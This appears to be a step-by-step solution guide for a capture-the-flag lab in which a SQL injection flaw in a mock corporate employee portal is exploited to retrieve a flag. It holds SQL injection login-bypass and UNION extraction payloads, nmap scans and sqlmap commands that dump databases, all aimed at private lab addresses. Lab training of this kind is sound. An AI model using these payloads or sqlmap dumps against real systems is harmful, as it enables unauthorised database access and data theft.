# How to Solve: Corporate Data Breach CTF Challenge

## 🎯 **Challenge Overview**

**Challenge Name:** corporate-data-breach  
**Difficulty:** Medium  
**Type:** Web Exploitation (SQL Injection)  
**Victim IP:** 172.25.195.153  
**Attacker IP:** 172.25.195.3  

**Objective:** Exploit a SQL injection vulnerability in TechCorp's employee portal to retrieve the CEO's confidential information (the flag).

---

## 📋 **Step-by-Step Solution Guide**

### **Step 1: Access the Attacker Machine**

1. **Deploy the challenge** (if not already deployed):
   ```
   deploy corporate-data-breach
   ```

2. **Get Guacamole Access URL:**
   - The deployment response should include a Guacamole URL
   - Format: `http://localhost:8080/guacamole/#/client/...`
   - Or check the deployment logs for the connection URL

3. **Access via Guacamole:**
   - Open the Guacamole URL in your browser
   - You'll have SSH access to the attacker machine (Kali Linux)
   - Login credentials: `root:toor` or `kali:kali`

---

### **Step 2: Reconnaissance**

From the attacker machine, gather information about the target:

```bash
# Check if victim is reachable
ping 172.25.195.153

# Scan for open ports
nmap -sV 172.25.195.153

# Check what services are running
nmap -p- 172.25.195.153
```

**Expected Results:**
- Port 80 (HTTP) should be open
- The web server is running Apache

---

### **Step 3: Access the Web Application**

1. **From the attacker machine, access the web portal:**
   ```bash
   # Using curl to check the website
   curl http://172.25.195.153/
   
   # Or use a browser tool (if available)
   # The README mentions: http://target-ip/portal/
   ```

2. **Navigate to the login portal:**
   - The challenge mentions: `http://target-ip/portal/`
   - So try: `http://172.25.195.153/portal/`

---

### **Step 4: Identify SQL Injection Vulnerability**

Based on the hints:
1. "The login form might not properly sanitize user input"
2. "Try using SQL injection techniques on the login parameters"
3. "Look for ways to extract data from other database tables using UNION queries"

**Test for SQL Injection:**

```bash
# Basic SQL injection test
# Try in username field:
admin' OR '1'='1'--
admin' OR '1'='1'#
' OR '1'='1'--

# Or in password field:
password' OR '1'='1'--
```

---

### **Step 5: Exploit SQL Injection**

**Method 1: Basic Authentication Bypass**

Try these payloads in the login form:

```
Username: admin' OR '1'='1'--
Password: anything

Username: ' OR '1'='1'--
Password: ' OR '1'='1'--

Username: admin'--
Password: (leave empty)
```

**Method 2: UNION-Based SQL Injection**

If basic bypass doesn't work, try UNION queries:

```sql
-- Find number of columns
admin' ORDER BY 1--
admin' ORDER BY 2--
admin' ORDER BY 3--
-- (Continue until you get an error)

-- Then use UNION to extract data
admin' UNION SELECT 1,2,3--
admin' UNION SELECT NULL,NULL,NULL--

-- Extract table names
admin' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--

-- Extract column names
admin' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='employees'--

-- Extract data
admin' UNION SELECT flag,NULL,NULL FROM secret_table--
```

---

### **Step 6: Extract the Flag**

The flag should be in one of these locations:

1. **In the database** (most likely):
   - Look for a table containing employee data
   - The flag might be in a column like `flag`, `secret`, `ceo_info`, etc.
   - Try: `UNION SELECT flag FROM flags--`

2. **In the response**:
   - After successful SQL injection, the flag might be displayed in the page
   - Check the HTML source or response

3. **In files** (if you get RCE):
   - `/var/www/html/flag.txt`
   - `/challenge/flag.txt`
   - `/root/flag.txt`

---

### **Step 7: Submit the Flag**

Once you find the flag, it should match the format:
```
CTF{sql_1nj3ct10n_m4st3r_2024}
```

Submit it through the platform's flag submission interface.

---

## 🔧 **Troubleshooting**

### **If you can't access the attacker machine:**

1. **Check if containers are running:**
   ```powershell
   docker ps --filter "name=corporate-data-breach"
   ```

2. **Check container logs:**
   ```powershell
   docker logs ctf-corporate-data-breach-attacker
   docker logs ctf-corporate-data-breach-techcorp-portal
   ```

3. **Verify IP addresses:**
   ```powershell
   docker inspect ctf-corporate-data-breach-attacker | Select-String "IPAddress"
   docker inspect ctf-corporate-data-breach-techcorp-portal | Select-String "IPAddress"
   ```

### **If the web server isn't responding:**

1. **Check if the container is running:**
   ```powershell
   docker ps -a --filter "name=techcorp-portal"
   ```

2. **Check container logs for errors:**
   ```powershell
   docker logs ctf-corporate-data-breach-techcorp-portal
   ```

3. **Verify the startup script exists:**
   ```powershell
   docker exec ctf-corporate-data-breach-techcorp-portal ls -la /start-services.sh
   ```

4. **If the script is missing, rebuild:**
   ```powershell
   cd packages/ctf-automation/challenges-repo/challenges/corporate-data-breach
   docker compose down
   docker compose build --no-cache
   docker compose up -d
   ```

---

## 🛠️ **Tools Available on Attacker Machine**

The attacker machine (Kali Linux) should have:
- `nmap` - Network scanning
- `curl` - HTTP requests
- `wget` - Download files
- `sqlmap` - Automated SQL injection tool (if available)
- `burpsuite` - Web proxy (if available)
- `gobuster` - Directory brute-forcing (if available)

---

## 💡 **Pro Tips**

1. **Use sqlmap for automated exploitation:**
   ```bash
   sqlmap -u "http://172.25.195.153/portal/login.php" --data="username=admin&password=test" --dbs
   sqlmap -u "http://172.25.195.153/portal/login.php" --data="username=admin&password=test" -D database_name --tables
   sqlmap -u "http://172.25.195.153/portal/login.php" --data="username=admin&password=test" -D database_name -T table_name --dump
   ```

2. **Check the source code** (if accessible):
   - Look for SQL queries in the application code
   - Identify vulnerable parameters

3. **Use Burp Suite** (if available):
   - Intercept requests
   - Modify parameters
   - Test different payloads

---

## 📝 **Expected Flag Format**

```
CTF{sql_1nj3ct10n_m4st3r_2024}
```

The actual flag will be different, but it should follow the `CTF{...}` format.

---

## ✅ **Success Criteria**

You've successfully solved the challenge when you:
1. ✅ Can access the attacker machine via Guacamole
2. ✅ Can reach the victim web server (172.25.195.153:80)
3. ✅ Successfully exploit the SQL injection vulnerability
4. ✅ Extract the flag from the database
5. ✅ Submit the flag through the platform

---

**Good luck! 🚀**

